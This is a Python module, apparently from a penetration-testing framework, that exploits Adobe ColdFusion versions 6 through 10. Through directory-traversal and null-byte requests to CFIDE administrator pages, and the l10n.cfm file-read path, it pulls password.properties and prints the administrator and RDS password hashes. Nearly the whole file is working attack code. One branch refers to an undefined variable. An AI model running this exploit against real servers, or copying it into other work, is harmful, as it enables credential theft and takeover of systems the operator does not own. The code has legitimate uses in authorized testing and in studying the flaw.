from auxiliary import Auxiliary
from log import LOG
import utility
import re


class Auxiliary:
    """ Classic password hash retrieval in versions
    6,7,8,9, and 10.  9/10 do it a bit differently, so we use a separate
    function for that.
    """

    def __init__(self):
        self.name = 'Administrative Hash Disclosure'
        self.versions = ["6.0", "7.0", "8.0", "9.0", "10.0"]
        self.flag = 'cf-hash'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True

        return False

    def checkURL(self, fingerengine, url, keyword):
        """ Given a URL with a format in it, sub in our traversal string
        and return if we match with a keyword.                
        """

        for dots in range(7, 12):
            
            if fingerengine.options.remote_os == 'linux':
                t_url = url.format("../" * dots)
            else:
                t_url = url.format("..\\" * dots)
        
            response = utility.requests_get(t_url)
            if response.status_code == 200 and keyword in response.content:

                return response.content
                        
    def run(self, fingerengine, fingerprint):
        """
        """

        found = False                
        utility.Msg("Attempting to dump administrative hash...")

        if float(fingerprint.version) > 8.0:
            return self.run_latter(fingerengine, fingerprint)

        directories = ['/CFIDE/administrator/enter.cfm',
                       '/CFIDE/wizards/common/_logintowizard.cfm',
                       '/CFIDE/administrator/archives/index.cfm',
                       '/CFIDE/install.cfm',
                       '/CFIDE/administrator/entman/index.cfm',
                      ]

        ver_dir = { "6.0" : "CFusionMX\lib\password.properties",
                    "7.0" : "CFusionMX7\lib\password.properties",
                    "8.0" : "ColdFusion8\lib\password.properties",
                    "JRun" : "JRun4\servers\cfusion\cfusion-ear\cfusion-war"\
                             "\WEB-INF\cfusion\lib\password.properties"
                  }

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        for path in directories:

            uri = ("%s?locale={0}" % path) + ver_dir[fingerprint.version] + "%00en"
            content = self.checkURL(fingerengine, base + uri, 'password=')
            if content:

                pw_hash = re.findall("password=(.*?)\r\n", content)
                rds_hash = re.findall("rdspassword=(.*?)\n", content)
                if len(pw_hash) > 0:
                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                    if len(rds_hash) > 0:
                        utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)

                    found = True                        
                    break

        if not found:
            utility.Msg("Hash not found, attempting JRun..")
            for path in directories:

                uri = ("%s?locale={1}" % path) + ver_dir["JRun"] + "%00en"
                content = self.checkURL(fingerengine, base + uri, 'password=')
                if content: 

                    pw_hash = re.findall("password=(.*?)\r\n", response.content)
                    rds_hash = re.findall("rdspassword=(.*?)\n", response.content)
                    if len(pw_hash) > 0:
                        utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                        if len(rds_hash) > 0:
                            utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)

                        break


    def run_latter(self, fingerengine, fingerprint):
        """ There's a slightly different way of doing this for 9/10, so we do that here
        """

        paths = []
        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it"\
              "&attributes.file=../../administrator/mail/download.cfm"\
              "&filename={0}&attributes.locale=it&attributes.var=it"\
              "&attributes.jscript=false&attributes.type=text/html"\
              "&attributes.charset=UTF-8&thisTag.executionmode=end"\
              "&thisTag.generatedContent=htp"

        if fingerengine.options.remote_os == 'linux':
            paths.append('opt/coldfusion/cfusion/lib/password.properties')
            if fingerprint.version == "9.0":
                paths.append('opt/coldfusion9/cfusion/lib/password.properties')
            else:
                paths.append('opt/coldfusion10/cfusion/lib/password.properties')

        else:
            paths.append('ColdFusion\lib\password.properties')
            if fingerprint.version == "9.0":
                paths.append('ColdFusion9\lib\password.properties')
                paths.append('ColdFusion9\cfusion\lib\password.properties')
            else:
                paths.append('ColdFusion10\lib\password.properties')
                paths.append('ColdFusion10\cfusion\lib\password.properties')

        for path in paths:

            luri = uri.format('{0}' + path)
            content = self.checkURL(fingerengine, base + luri, 'password=')
            if content:

                pw_hash = re.findall("password=(.*?)\r\n", content)
                if len(pw_hash) > 0:
                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                    break
